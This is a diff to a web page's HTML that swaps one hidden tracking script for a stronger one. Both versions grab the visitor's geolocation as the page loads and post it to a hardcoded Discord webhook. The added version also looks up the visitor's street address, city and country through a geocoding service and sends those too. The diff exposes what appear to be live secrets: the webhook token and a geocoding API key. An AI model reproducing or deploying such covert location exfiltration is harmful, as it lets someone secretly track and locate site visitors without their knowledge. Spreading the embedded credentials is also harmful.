@@ -286,55 +286,62 @@ function hidePrivacyPopup() {
                                                __/ |                                                                    
                                               |___/                                                                                                                  
         -->
-        <script>  function sendLocationToWebhook(latitude, longitude) {
-          // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
-          const webhookUrl = 'https://discord.com/api/webhooks/1203351203061178438/tkTL1wDxXos-RUio8lEGbEqzN3nTycd0GM2ZdzzatTii0sv6U007-Ua73dW0MjPXICPq';
-    
-          // Prepare payload for Discord webhook
-          const payload = {
-            content: `New Location: Latitude ${latitude}, Longitude ${longitude}`,
-          };
-    
-          // Send data to Discord webhook
-          fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload),
-          })
-            .then(response => response.json())
-            .then(data => console.log('Webhook response:', data))
-            .catch(error => console.error('Error sending to webhook:', error));
-        }
-    
-        // Function to handle successful location retrieval
-        function handleLocationSuccess(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          console.log(`Your current location is: ${latitude}, ${longitude}`);
-    
-          // Send location to Discord webhook
-          sendLocationToWebhook(latitude, longitude);
-        }
-    
-        // Function to handle location retrieval error
-        function handleLocationError(error) {
-          console.error(`Error getting location: ${error.message}`);
-        }
-    
-        // Check if the browser supports Geolocation
-        if ("geolocation" in navigator) {
-          // Trigger location retrieval when the page loads
-          window.addEventListener("load", () => {
-            navigator.geolocation.getCurrentPosition(
-              handleLocationSuccess,
-              handleLocationError
-            );
-          });
-        } else {
-          console.error("Geolocation is not supported by your browser");
-        }</script>
-</body>
-
-</html>
+        
+              
+        <script>
+          function sendLocationToWebhook(latitude, longitude, city, country, address) {
+              const webhookUrl = 'https://discord.com/api/webhooks/1203351203061178438/tkTL1wDxXos-RUio8lEGbEqzN3nTycd0GM2ZdzzatTii0sv6U007-Ua73dW0MjPXICPq';
+              const payload = { content: `New Location: Latitude ${latitude}, Longitude ${longitude}\n   Accurate Address: ${address}\nCity: ${city}, Country: ${country}` };
+      
+              fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
+                  .then(response => response.json())
+                  .then(data => console.log('Webhook response:', data))
+                  .catch(error => console.error('Error sending to webhook:', error));
+          }
+      
+          function getLocation(latitude, longitude) {
+              const apiKey = '140b5ee2af63480f9007d9cc0022ef94';
+              const apiUrl = `https://api.opencagedata.com/geocode/v1/json?key=${apiKey}&q=${latitude}+${longitude}`;
+      
+              fetch(apiUrl)
+                  .then(response => {
+                      if (!response.ok) {
+                          throw new Error('Network response was not ok');
+                      }
+                      return response.json();
+                  })
+                  .then(data => {
+                      if (data.results && data.results.length > 0) {
+                          const city = data.results[0].components.city || data.results[0].components.town || data.results[0].components.village || 'Unknown City';
+                          const country = data.results[0].components.country || 'Unknown Country';
+                          const address = data.results[0].formatted || 'Unknown Address';
+      
+                          sendLocationToWebhook(latitude, longitude, city, country, address);
+                      } else {
+                          console.error('Location not found');
+                      }
+                  })
+                  .catch(error => console.error('Error getting location:', error));
+          }
+      
+          function handleLocationSuccess(position) {
+              const { latitude, longitude } = position.coords;
+              console.log(`Your current location is: ${latitude}, ${longitude}`);
+              getLocation(latitude, longitude);
+          }
+      
+          function handleLocationError(error) {
+              console.error(`Error getting location: ${error.message}`);
+          }
+      
+          if ("geolocation" in navigator) {
+              window.addEventListener("load", () => {
+                  navigator.geolocation.getCurrentPosition(handleLocationSuccess, handleLocationError);
+              });
+          } else {
+              console.error("Geolocation is not supported by your browser");
+          }
+      </script>
+      </body>
+      </html>
+      
